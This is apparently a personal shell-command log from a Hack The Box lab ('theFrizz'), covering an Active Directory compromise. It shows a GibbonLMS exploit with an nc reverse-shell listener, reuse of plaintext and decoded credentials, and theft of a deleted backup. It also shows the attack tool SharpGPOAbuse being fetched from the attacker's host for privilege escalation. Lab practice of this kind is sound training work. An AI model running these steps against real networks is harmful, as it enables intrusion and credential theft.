[2026-01-20 21:57:49] [pane=%2] [CMD] impacket-smbexec -k -no-pass frixzz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:57:58] [pane=%2] [CMD] impacket-smbexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:59:02] [pane=%2] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.68.132
[2026-01-20 22:00:01] [pane=%2] [CMD] wc ldapsearch_f.frizzle.txt
[2026-01-20 22:11:34] [pane=%2] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.68.132
[2026-01-20 22:13:20] [pane=%2] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 22:21:27] [pane=%2] [CMD] smbmap -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb -H 10.129.232.168
[2026-01-20 22:21:53] [pane=%2] [CMD] vim ~/.ip
[2026-01-20 22:22:59] [pane=%2] [CMD] impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.232.168
[2026-01-20 22:23:10] [pane=%2] [CMD] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/f.frizzle.ccache
[2026-01-20 22:23:30] [pane=%2] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 22:24:09] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-20 22:25:01] [pane=%2] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 22:41:59] [pane=%3] [CMD] ll
[2026-01-20 22:42:12] [pane=%3] [CMD] strings GPT.INI
[2026-01-20 22:42:35] [pane=%3] [CMD] strings GptTmpl.inf
[2026-01-20 22:42:44] [pane=%3] [CMD] file GptTmpl.inf
[2026-01-20 22:42:51] [pane=%3] [CMD] cat GptTmpl.inf
[2026-01-21 00:07:38] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-21 00:08:46] [pane=%2] [CMD] vim ~/.ip
[2026-01-21 00:10:03] [pane=%2] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-21 00:12:46] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-21 00:12:53] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-21 00:17:36] [pane=%3] [CMD] ls
[2026-01-21 00:17:38] [pane=%3] [CMD] ll
[2026-01-21 00:18:25] [pane=%3] [CMD] mkdir {31B2F340-016D-11D2-945F-00C04FB984F9}
[2026-01-21 00:18:26] [pane=%3] [CMD] ll
[2026-01-21 00:18:57] [pane=%3] [CMD] mv GPT.INI GptTmpl.inf \{31B2F340-016D-11D2-945F-00C04FB984F9\}
[2026-01-21 00:18:58] [pane=%3] [CMD] ll
[2026-01-21 00:21:09] [pane=%3] [CMD] mkdir 6AC1786C-016F-11D2-945F-00C04fB984F9 
[2026-01-21 00:27:28] [pane=%3] [CMD] ll
[2026-01-21 00:27:43] [pane=%3] [CMD] cat GPT.INI
[2026-01-21 00:27:51] [pane=%3] [CMD] cat GptTmpl.inf
[2026-01-21 00:29:23] [pane=%1] [CMD] sudo vim /etc/hosts
[2026-01-21 00:30:34] [pane=%2] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-21 00:31:18] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-21 00:31:40] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-21 00:52:13] [pane=%3] [CMD] cd ..
[2026-01-21 00:52:20] [pane=%3] [CMD] mkdir bloodhound
[2026-01-21 00:52:24] [pane=%3] [CMD] cd bloodhound
[2026-01-21 00:54:02] [pane=%3] [CMD] bloodhound-python -u f.frizzlw -p 'Jenni_Luvs_Magic23' -d frizz.htb -ns 10.129.68.181 -c All --zip
[2026-01-21 00:54:18] [pane=%3] [CMD] sudo bloodhound-python -u f.frizzlw -p 'Jenni_Luvs_Magic23' -d frizz.htb -ns 10.129.68.181 -c All --zip
[2026-01-21 00:55:35] [pane=%3] [CMD] sudo vim /etc/hosts
[2026-01-21 00:56:06] [pane=%3] [CMD] sudo bloodhound-python -u f.frizzlw -p 'Jenni_Luvs_Magic23' -d frizz.htb -ns 10.129.232.168 -c All --zip
[2026-01-21 00:56:18] [pane=%3] [CMD] sudo bloodhound-python -u f.frizzle -p 'Jenni_Luvs_Magic23' -d frizz.htb -ns 10.129.232.168 -c All --zip
[2026-01-21 06:19:54] [pane=%3] [CMD] nxc winrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
[2026-01-21 06:20:21] [pane=%3] [CMD] sudo vim /etc/hosts
[2026-01-21 06:20:40] [pane=%3] [CMD] nxc winrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
[2026-01-21 06:21:03] [pane=%2] [CMD] cat ../nmap/theFrizzNmapServicesVersions.txt
[2026-01-21 06:28:16] [pane=%2] [CMD] ll
[2026-01-21 06:28:39] [pane=%2] [CMD] klist
[2026-01-21 06:30:43] [pane=%2] [CMD] vim /etc/ssh/ssh_config
[2026-01-21 06:31:32] [pane=%2] [CMD] kinit
[2026-01-21 06:35:01] [pane=%2] [CMD] echo $KRB5_CONFIG=/etc/krb5.conf
[2026-01-21 06:35:17] [pane=%2] [CMD] cat /etc/krb5.conf
[2026-01-21 06:36:03] [pane=%2] [CMD] kinit
[2026-01-21 06:36:23] [pane=%2] [CMD] kinit
[2026-01-21 06:37:05] [pane=%2] [CMD] ssh -k f.frizzle@frizz.htb
[2026-01-21 06:37:36] [pane=%3] [CMD] klist
[2026-01-21 06:38:16] [pane=%2] [CMD] klist
[2026-01-21 06:38:29] [pane=%3] [CMD] klist
[2026-01-21 06:40:20] [pane=%2] [CMD] kdestroy
[2026-01-21 06:40:23] [pane=%2] [CMD] klist
[2026-01-21 06:40:30] [pane=%2] [CMD] kinit
[2026-01-21 06:40:52] [pane=%2] [CMD] kinit f.frizzle
[2026-01-21 06:41:18] [pane=%2] [CMD] klist
[2026-01-21 06:41:29] [pane=%2] [CMD] ssh -k f.frizzle@frizz.htb
[2026-01-21 06:42:56] [pane=%2] [CMD] ssh -K f.frizzle@frizz.htb
[2026-01-21 06:43:33] [pane=%2] [CMD] ssh -K f.frizzle@10.129.232.168
[2026-01-21 06:44:17] [pane=%3] [CMD] sudo vim /etc/ssh/ssh_config
[2026-01-21 06:44:51] [pane=%2] [CMD] ssh -K f.frizzle@10.129.232.168
[2026-01-21 06:45:52] [pane=%2] [CMD] sudo systemctl restart ssh.service
[2026-01-21 06:46:29] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-21 06:47:31] [pane=%2] [CMD] ssh -K f.frizzle@10.129.232.168
[2026-01-21 06:49:00] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-21 06:49:16] [pane=%2] [CMD] vim ~/.ip
[2026-01-21 06:50:07] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-21 06:50:29] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-21 07:02:29] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-21 07:03:16] [pane=%2] [CMD] ssh f.frizzle@frizz.htb
[2026-01-21 07:03:35] [pane=%2] [CMD] ssh f.frizzle@frizzdc.frizz.htb
[2026-01-21 07:04:52] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-21 07:05:05] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-21 07:06:06] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-21 07:15:24] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-21 07:16:46] [pane=%2] [CMD] ssh f.frizzle@frizz.htb
[2026-01-21 07:17:15] [pane=%2] [CMD] ssh f.frizzle@frizzdc.frizz.htb
[2026-01-21 07:43:35] [pane=%2] [CMD] ssh f.frizzle@frizzdc.frizz.htb
[2026-01-21 17:49:32] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-21 17:49:54] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-21 17:49:59] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-21 17:50:23] [pane=%1] [CMD] ip a
[2026-01-21 17:50:41] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-21 17:50:46] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-22 11:40:14] [pane=%2] [CMD] tmux detach
[2026-01-22 13:39:15] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-22 13:39:16] [pane=%0] [CMD] ll
[2026-01-22 13:45:16] [pane=%0] [CMD] tmux exit
[2026-01-22 13:45:22] [pane=%0] [CMD] tmux kill-session
[2026-01-22 14:39:35] [pane=%0] [CMD] tmux exit
[2026-01-22 14:39:58] [pane=%0] [CMD] tmux detach
[2026-01-22 15:59:45] [pane=%0] [CMD] tmux detach
[2026-01-22 15:59:56] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-22 15:59:57] [pane=%0] [CMD] ll
[2026-01-22 16:30:56] [pane=%0] [CMD] ssh f.frizzle@frizzdc.frizz.htb
[2026-01-22 16:55:10] [pane=%0] [CMD] ssh f.frizzle@frizzdc.frizz.htb
[2026-01-22 16:55:31] [pane=%0] [CMD] ssh f.frizzle@frizz.htb
[2026-01-22 16:57:07] [pane=%0] [CMD] cat /etc/hosts
[2026-01-23 10:12:37] [pane=%0] [CMD] vim ~/.ip
[2026-01-23 10:16:22] [pane=%0] [CMD] cat /etc/hosts
[2026-01-23 10:16:49] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-01-23 10:17:39] [pane=%0] [CMD] ssh f.frizzle@frizz.htb
[2026-01-23 10:31:06] [pane=%0] [CMD] ssh -K f.frizzle@frizz.htb
[2026-01-23 10:31:32] [pane=%0] [CMD] ssh -K f.frizzle@frizzDC.frizz.htb
[2026-01-23 10:40:21] [pane=%0] [CMD] jkust
[2026-01-23 10:40:28] [pane=%0] [CMD] klist
[2026-01-23 11:06:04] [pane=%0] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-23 11:17:28] [pane=%0] [CMD] sudo nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-23 11:29:08] [pane=%0] [CMD] /home/b7h30/.local/bin/nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-23 11:30:01] [pane=%0] [CMD] sudo /home/b7h30/.local/bin/nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-23 11:30:40] [pane=%0] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf
[2026-01-23 11:30:45] [pane=%0] [CMD] ll
[2026-01-23 11:31:09] [pane=%0] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
[2026-01-23 11:33:23] [pane=%0] [CMD] sudo date --set="$(date -d '+7 hours')"
[2026-01-23 18:33:37] [pane=%0] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
[2026-01-23 18:34:16] [pane=%0] [CMD] sudo cp ./krb5.conf /etc/krb5.conf
[2026-01-23 18:34:52] [pane=%0] [CMD] impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.71.156
[2026-01-23 18:36:31] [pane=%0] [CMD] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/f.frizzle.ccache
[2026-01-23 18:36:34] [pane=%0] [CMD] klist
[2026-01-23 18:36:46] [pane=%0] [CMD] ssh -K f.frizzle@frizzDC.frizz.htb
[2026-01-23 19:12:28] [pane=%1] [CMD] : #note found user flag by ssh using f.frizzle credentials and kerberos authentication. flag.txt 3c3af80b3aeefee66dcab6a12491bbab in f.frizzle Desktop directory
[2026-01-23 19:55:05] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz/loot
[2026-01-23 19:55:08] [pane=%1] [CMD] scp -o 'GSSAPIAuthentication=yes' -o 'GSSAPIDelegateCredentials=yes' f.frizzle@frizzDC.frizz.htb:'C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z' ./deleted_archive.7z
[2026-01-23 19:56:12] [pane=%1] [CMD] scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
[2026-01-23 19:56:38] [pane=%1] [CMD] scp 'f.frizzle@frizzdc.frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
[2026-01-23 19:56:48] [pane=%1] [CMD] scp -K 'f.frizzle@frizzdc.frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
[2026-01-23 19:58:49] [pane=%1] [CMD] scp -K 'f.frizzle@frizzDC.frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
[2026-01-23 19:58:55] [pane=%1] [CMD] scp 'f.frizzle@frizzDC.frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
[2026-01-23 20:01:17] [pane=%1] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@frizzdc.frizz.htb
[2026-01-23 20:01:37] [pane=%1] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.71.156
[2026-01-23 20:01:52] [pane=%1] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-23 20:02:19] [pane=%1] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@10.129.71.156
[2026-01-23 20:03:11] [pane=%1] [CMD] impacket-smbclient 'f.frizzle:Jenni_Luvs_Magic23@frizz.htb'
[2026-01-23 20:03:35] [pane=%1] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.71.156
[2026-01-23 20:04:20] [pane=%1] [CMD] cat /etc/hosts
[2026-01-23 20:04:40] [pane=%1] [CMD] klist
[2026-01-23 20:05:40] [pane=%1] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
[2026-01-23 20:06:01] [pane=%1] [CMD] ll
[2026-01-23 20:06:04] [pane=%1] [CMD] cd ..
[2026-01-23 20:06:05] [pane=%1] [CMD] ll
[2026-01-23 20:06:07] [pane=%1] [CMD] klist
[2026-01-23 20:06:21] [pane=%1] [CMD] cat krb5.conf
[2026-01-23 20:06:58] [pane=%1] [CMD] sudo cp ./krb5.conf /etc/krb5.conf
[2026-01-23 20:07:09] [pane=%1] [CMD] impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.71.156
[2026-01-23 20:07:21] [pane=%1] [CMD] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/f.frizzle.ccache
[2026-01-23 20:07:24] [pane=%1] [CMD] klist
[2026-01-23 20:07:40] [pane=%1] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
[2026-01-23 20:08:02] [pane=%1] [CMD] xc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
[2026-01-23 20:08:12] [pane=%1] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
[2026-01-23 20:08:33] [pane=%1] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.71.156
[2026-01-23 20:08:38] [pane=%1] [CMD] klist
[2026-01-23 20:08:53] [pane=%1] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@10.129.71.156
[2026-01-23 20:09:06] [pane=%1] [CMD] impacket-smbclient -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-23 20:12:17] [pane=%1] [CMD] scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
[2026-01-23 20:12:30] [pane=%1] [CMD] dir
[2026-01-23 20:12:32] [pane=%1] [CMD] ll
[2026-01-23 21:01:06] [pane=%1] [CMD] 7z wapt-backup-sunday.7z
[2026-01-23 21:01:22] [pane=%1] [CMD] ll
[2026-01-23 21:01:38] [pane=%1] [CMD] 7z x wapt-backup-sunday.7z
[2026-01-23 21:01:40] [pane=%1] [CMD] ll
[2026-01-23 21:01:46] [pane=%1] [CMD] cd wapt
[2026-01-23 21:01:50] [pane=%1] [CMD] ll
[2026-01-23 21:02:14] [pane=%1] [CMD] cat COPYING.txt
[2026-01-23 21:03:21] [pane=%1] [CMD] cd conf
[2026-01-23 21:03:23] [pane=%1] [CMD] ll
[2026-01-23 21:03:50] [pane=%1] [CMD] cat waptserver.ini
[2026-01-23 21:04:52] [pane=%1] [CMD] ll
[2026-01-23 21:07:30] [pane=%1] [CMD] cat waptserver.ini
[2026-01-23 21:07:47] [pane=%1] [CMD] : #note waptserver.ini has a secret key in it
[2026-01-23 21:08:03] [pane=%1] [CMD] : #note waptserver.ini has a secret key in it secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
[2026-01-23 21:12:21] [pane=%1] [CMD] echo 'ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ' | base64 -d
[2026-01-23 21:13:02] [pane=%1] [CMD] : #note secret key decodes to jibberish
[2026-01-23 21:13:33] [pane=%1] [CMD] : #note there is a wapt_password in waptserver.ini wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
[2026-01-23 21:13:59] [pane=%1] [CMD] echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
[2026-01-23 21:15:25] [pane=%1] [CMD] nxc smb frizzDC.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k 
[2026-01-23 21:15:59] [pane=%1] [CMD] : #note waptpassword worked for m.schoolbus smb auth
[2026-01-23 21:16:27] [pane=%1] [CMD] nxc ssh frizzDC.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k 
[2026-01-23 21:17:11] [pane=%1] [CMD] kinit m.schoolbus
[2026-01-23 21:17:35] [pane=%1] [CMD] ssh -k m.schoolbus@frizzdc.frizz.htb
[2026-01-23 21:20:07] [pane=%2] [CMD] : #note m.schoolbus is able to login to ssh with decoded password from waptserver.ini 
[2026-01-23 23:27:39] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-23 23:28:24] [pane=%2] [CMD] wget https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.5_Any/SharpGPOAbuse.exe
[2026-01-23 23:28:27] [pane=%2] [CMD] ll
[2026-01-23 23:31:16] [pane=%2] [CMD] : #note sharpGPOAbuse downloaded to scp to windows target. purpose built tool for GPO abuse. Can add user to local admin or domain admin group via GPO. works with WriteGPLink permission, which m.schollbus has over class_frizz and v.frizzle which is a domain adming.
[2026-01-23 23:33:48] [pane=%2] [CMD] scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:'C:/Users/M.SchoolBus/Desktop/SharpGPOAbuse.exe'
[2026-01-23 23:35:21] [pane=%2] [CMD] scp -k SharpGPOAbuse.exe m.schoolbus@frizz.htb:'C:/Users/M.SchoolBus/Desktop/SharpGPOAbuse.exe'
[2026-01-23 23:35:28] [pane=%2] [CMD] scp -K SharpGPOAbuse.exe m.schoolbus@frizz.htb:'C:/Users/M.SchoolBus/Desktop/SharpGPOAbuse.exe'
[2026-01-23 23:35:48] [pane=%2] [CMD] scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:'C:/Users/M.SchoolBus/Desktop/SharpGPOAbuse.exe'
[2026-01-23 23:56:06] [pane=%2] [CMD] scp --help | grep kerberos
[2026-01-23 23:56:17] [pane=%2] [CMD] scp | grep kerberos
[2026-01-23 23:56:25] [pane=%2] [CMD] man scp
[2026-01-23 23:56:32] [pane=%2] [CMD] man scp | grep kerberos
[2026-01-23 23:56:38] [pane=%2] [CMD] scp --help
[2026-01-23 23:56:44] [pane=%2] [CMD] scp help
[2026-01-23 23:58:15] [pane=%2] [CMD] base64 -w 0 SharpGPOAbuse.exe > SharpGPOAbuse.b64
[2026-01-23 23:58:18] [pane=%2] [CMD] ll
[2026-01-23 23:58:25] [pane=%2] [CMD] less SharpGPOAbuse.b64
[2026-01-23 23:58:43] [pane=%2] [CMD] vim SharpGPOAbuse.b64
[2026-01-24 00:00:32] [pane=%2] [CMD] scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:'C:/Users/M.SchoolBus/Desktop/SharpGPOAbuse.exe'
[2026-01-24 00:01:52] [pane=%2] [CMD] scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:C:/windows/temp/
[2026-01-24 00:02:07] [pane=%2] [CMD] scp -k SharpGPOAbuse.exe m.schoolbus@frizz.htb:/windows/temp/
[2026-01-24 00:05:08] [pane=%2] [CMD] python3 -m http.server 6969
[2026-01-24 00:06:26] [pane=%3] [CMD] ip a
[2026-01-24 00:07:27] [pane=%3] [CMD] : #note spun up python webserver from kali
[2026-01-24 00:07:58] [pane=%3] [CMD] : #note pulled SharpGPOAbuse.exe on to windows machine with $ PS C:\Users\M.SchoolBus\Desktop> Invoke-WebRequest -Uri "http://10.10.14.89:6969/SharpGPOAbuse.exe" -OutFile "SharpGPOAbuse.exe"
[2026-01-24 00:19:47] [pane=%2] [CMD] rlwrap nc -lnvp 6969
[2026-01-24 06:46:00] [pane=%3] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-24 06:46:07] [pane=%3] [CMD] ll
[2026-01-24 06:46:14] [pane=%3] [CMD] cd loot
[2026-01-24 06:46:15] [pane=%3] [CMD] ll
[2026-01-24 06:46:29] [pane=%3] [CMD] cd ..
[2026-01-24 06:46:32] [pane=%3] [CMD] cd evidence
[2026-01-24 06:46:32] [pane=%3] [CMD] ll
[2026-01-24 06:46:44] [pane=%3] [CMD] cat gibbonCredsFull.txt
[2026-01-24 00:49:39] [pane=%3] [CMD] tmux kill-session
